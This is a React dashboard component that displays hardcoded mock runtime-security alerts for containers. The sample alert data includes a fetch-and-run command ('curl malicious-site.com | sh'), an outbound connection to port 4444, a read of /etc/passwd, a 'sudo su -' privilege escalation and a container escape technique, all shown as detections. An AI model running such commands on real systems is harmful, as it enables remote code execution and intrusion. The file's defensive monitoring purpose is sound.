import React, { useState } from 'react';
import {
  Card,
  CardContent,
  Typography,
  Box,
  List,
  ListItem,
  ListItemText,
  ListItemIcon,
  Avatar,
  Chip,
  Button,
  IconButton,
  Tooltip,
  useTheme,
  alpha,
} from '@mui/material';
import {
  PlayArrow as RuntimeIcon,
  Error as ErrorIcon,
  Warning as WarningIcon,
  Info as InfoIcon,
  Timeline as TimelineIcon,
  Block as BlockIcon,
  Visibility as ViewIcon,
  Code as ProcessIcon,
  NetworkCheck as NetworkIcon,
  Storage as FileIcon,
  Security as SecurityIcon,
} from '@mui/icons-material';
import { motion } from 'framer-motion';

interface RuntimeSecurityAlertsProps {
  expanded?: boolean;
}

const RuntimeSecurityAlerts: React.FC<RuntimeSecurityAlertsProps> = ({ expanded = false }) => {
  const theme = useTheme();
  
  const alertsData = {
    summary: {
      critical: 2,
      high: 5,
      medium: 12,
      low: 8
    },
    recentAlerts: [
      {
        id: 1,
        severity: 'critical',
        type: 'process',
        title: 'Suspicious Container Runtime Activity',
        description: 'Unauthorized process execution detected in production container',
        resource: 'prod-web-app-7f8d9',
        namespace: 'production',
        time: '2 minutes ago',
        status: 'investigating',
        details: {
          process: '/bin/bash -c "curl malicious-site.com | sh"',
          user: 'root',
          pid: 1337
        }
      },
      {
        id: 2,
        severity: 'high',
        type: 'network',
        title: 'Anomalous Network Connection',
        description: 'Unexpected outbound connection to suspicious IP',
        resource: 'api-service-2x9k1',
        namespace: 'default',
        time: '8 minutes ago',
        status: 'blocked',
        details: {
          destination: '192.168.1.100:4444',
          protocol: 'TCP',
          bytes: '2.3MB'
        }
      },
      {
        id: 3,
        severity: 'medium',
        type: 'file',
        title: 'Sensitive File Access',
        description: 'Access to sensitive configuration files detected',
        resource: 'db-worker-5h7j2',
        namespace: 'database',
        time: '15 minutes ago',
        status: 'monitoring',
        details: {
          file: '/etc/passwd',
          operation: 'read',
          user: 'www-data'
        }
      },
      {
        id: 4,
        severity: 'high',
        type: 'process',
        title: 'Privilege Escalation Attempt',
        description: 'Process attempting to escalate privileges',
        resource: 'worker-node-3',
        namespace: 'kube-system',
        time: '22 minutes ago',
        status: 'resolved',
        details: {
          process: 'sudo su -',
          fromUser: 'app',
          toUser: 'root'
        }
      },
      {
        id: 5,
        severity: 'critical',
        type: 'security',
        title: 'Container Breakout Attempt',
        description: 'Attempt to escape container sandbox detected',
        resource: 'untrusted-app-9k2l5',
        namespace: 'sandbox',
        time: '35 minutes ago',
        status: 'blocked',
        details: {
          technique: 'Mount namespace escape',
          blocked: true,
          action: 'Container terminated'
        }
      }
    ]
  };

  const getSeverityColor = (severity: string) => {
    switch (severity) {
      case 'critical': return '#ef4444';
      case 'high': return '#f97316';
      case 'medium': return '#eab308';
      case 'low': return '#06b6d4';
      default: return '#6b7280';
    }
  };

  const getStatusColor = (status: string) => {
    switch (status) {
      case 'investigating': return '#eab308';
      case 'blocked': return '#ef4444';
      case 'monitoring': return '#3b82f6';
      case 'resolved': return '#10b981';
      default: return '#6b7280';
    }
  };

  const getTypeIcon = (type: string) => {
    switch (type) {
      case 'process': return <ProcessIcon />;
      case 'network': return <NetworkIcon />;
      case 'file': return <FileIcon />;
      case 'security': return <SecurityIcon />;
      default: return <RuntimeIcon />;
    }
  };

  const displayedAlerts = expanded ? alertsData.recentAlerts : alertsData.recentAlerts.slice(0, 3);

  return (
    <motion.div
      initial={{ opacity: 0, x: 20 }}
      animate={{ opacity: 1, x: 0 }}
      transition={{ duration: 0.5, delay: 0.3 }}
    >
      <Card sx={{ 
        background: 'linear-gradient(135deg, #1e293b, #334155)', 
        border: '1px solid rgba(255,255,255,0.1)',
        height: expanded ? 'auto' : '100%'
      }}>
        <CardContent>
          <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 3 }}>
            <Typography variant="h6" sx={{ display: 'flex', alignItems: 'center' }}>
              <RuntimeIcon sx={{ mr: 1, color: '#3b82f6' }} />
              Runtime Security Alerts
            </Typography>
            {!expanded && (
              <Button 
                size="small" 
                sx={{ color: '#3b82f6' }}
                endIcon={<ViewIcon />}
              >
                View All
              </Button>
            )}
          </Box>

          {/* Alert Summary */}
          <Box sx={{ 
            display: 'flex', 
            justifyContent: 'space-around', 
            mb: 3,
            p: 2,
            backgroundColor: 'rgba(0,0,0,0.2)',
            borderRadius: 2
          }}>
            <Box sx={{ textAlign: 'center' }}>
              <Typography variant="h5" sx={{ color: '#ef4444', fontWeight: 700 }}>
                {alertsData.summary.critical}
              </Typography>
              <Typography variant="caption" sx={{ color: 'rgba(255,255,255,0.7)' }}>
                Critical
              </Typography>
            </Box>
            <Box sx={{ textAlign: 'center' }}>
              <Typography variant="h5" sx={{ color: '#f97316', fontWeight: 700 }}>
                {alertsData.summary.high}
              </Typography>
              <Typography variant="caption" sx={{ color: 'rgba(255,255,255,0.7)' }}>
                High
              </Typography>
            </Box>
            <Box sx={{ textAlign: 'center' }}>
              <Typography variant="h5" sx={{ color: '#eab308', fontWeight: 700 }}>
                {alertsData.summary.medium}
              </Typography>
              <Typography variant="caption" sx={{ color: 'rgba(255,255,255,0.7)' }}>
                Medium
              </Typography>
            </Box>
            <Box sx={{ textAlign: 'center' }}>
              <Typography variant="h5" sx={{ color: '#06b6d4', fontWeight: 700 }}>
                {alertsData.summary.low}
              </Typography>
              <Typography variant="caption" sx={{ color: 'rgba(255,255,255,0.7)' }}>
                Low
              </Typography>
            </Box>
          </Box>

          {/* Recent Alerts */}
          <Typography variant="subtitle2" sx={{ mb: 2, color: 'rgba(255,255,255,0.8)' }}>
            Recent Runtime Alerts
          </Typography>
          <List sx={{ maxHeight: expanded ? 'none' : 400, overflow: 'auto' }}>
            {displayedAlerts.map((alert, index) => (
              <motion.div
                key={alert.id}
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.3, delay: index * 0.1 }}
              >
                <ListItem 
                  sx={{ 
                    px: 0, 
                    py: 2,
                    backgroundColor: 'rgba(0,0,0,0.2)',
                    borderRadius: 2,
                    mb: 2,
                    border: `1px solid ${alpha(getSeverityColor(alert.severity), 0.3)}`
                  }}
                >
                  <ListItemIcon>
                    <Avatar sx={{ 
                      width: 40, 
                      height: 40, 
                      backgroundColor: getSeverityColor(alert.severity) 
                    }}>
                      {getTypeIcon(alert.type)}
                    </Avatar>
                  </ListItemIcon>
                  <ListItemText
                    primary={
                      <Box>
                        <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 1 }}>
                          <Typography variant="subtitle2" sx={{ fontWeight: 600 }}>
                            {alert.title}
                          </Typography>
                          <Box sx={{ display: 'flex', gap: 1 }}>
                            <Chip 
                              label={alert.severity.toUpperCase()}
                              size="small"
                              sx={{ 
                                backgroundColor: alpha(getSeverityColor(alert.severity), 0.2),
                                color: getSeverityColor(alert.severity),
                                fontSize: '0.7rem'
                              }}
                            />
                            <Chip 
                              label={alert.status}
                              size="small"
                              sx={{ 
                                backgroundColor: alpha(getStatusColor(alert.status), 0.2),
                                color: getStatusColor(alert.status),
                                fontSize: '0.7rem'
                              }}
                            />
                          </Box>
                        </Box>
                        <Typography variant="body2" sx={{ color: 'rgba(255,255,255,0.7)', mb: 1 }}>
                          {alert.description}
                        </Typography>
                        <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 1 }}>
                          <Typography variant="caption" sx={{ color: 'rgba(255,255,255,0.5)' }}>
                            Resource: {alert.resource} • Namespace: {alert.namespace}
                          </Typography>
                          <Typography variant="caption" sx={{ color: 'rgba(255,255,255,0.5)' }}>
                            {alert.time}
                          </Typography>
                        </Box>
                        {expanded && (
                          <Box sx={{ 
                            mt: 2, 
                            p: 2, 
                            backgroundColor: 'rgba(0,0,0,0.3)', 
                            borderRadius: 1,
                            border: '1px solid rgba(255,255,255,0.1)'
                          }}>
                            <Typography variant="caption" sx={{ color: 'rgba(255,255,255,0.8)', fontWeight: 600 }}>
                              Details:
                            </Typography>
                            {Object.entries(alert.details).map(([key, value]) => (
                              <Box key={key} sx={{ display: 'flex', justifyContent: 'space-between', mt: 0.5 }}>
                                <Typography variant="caption" sx={{ color: 'rgba(255,255,255,0.6)' }}>
                                  {key}:
                                </Typography>
                                <Typography variant="caption" sx={{ color: 'rgba(255,255,255,0.8)', fontFamily: 'monospace' }}>
                                  {String(value)}
                                </Typography>
                              </Box>
                            ))}
                          </Box>
                        )}
                      </Box>
                    }
                  />
                  <Box sx={{ display: 'flex', flexDirection: 'column', gap: 1, ml: 2 }}>
                    <Tooltip title="View Details">
                      <IconButton size="small" sx={{ color: 'rgba(255,255,255,0.7)' }}>
                        <ViewIcon />
                      </IconButton>
                    </Tooltip>
                    {alert.status !== 'blocked' && alert.status !== 'resolved' && (
                      <Tooltip title="Block">
                        <IconButton size="small" sx={{ color: '#ef4444' }}>
                          <BlockIcon />
                        </IconButton>
                      </Tooltip>
                    )}
                  </Box>
                </ListItem>
              </motion.div>
            ))}
          </List>

          {expanded && (
            <Box sx={{ mt: 3, textAlign: 'center' }}>
              <Button 
                variant="outlined" 
                sx={{ 
                  color: 'white', 
                  borderColor: 'rgba(255,255,255,0.3)',
                  '&:hover': {
                    borderColor: 'rgba(255,255,255,0.5)',
                    backgroundColor: 'rgba(255,255,255,0.05)'
                  }
                }}
              >
                Load More Alerts
              </Button>
            </Box>
          )}
        </CardContent>
      </Card>
    </motion.div>
  );
};

export default RuntimeSecurityAlerts;
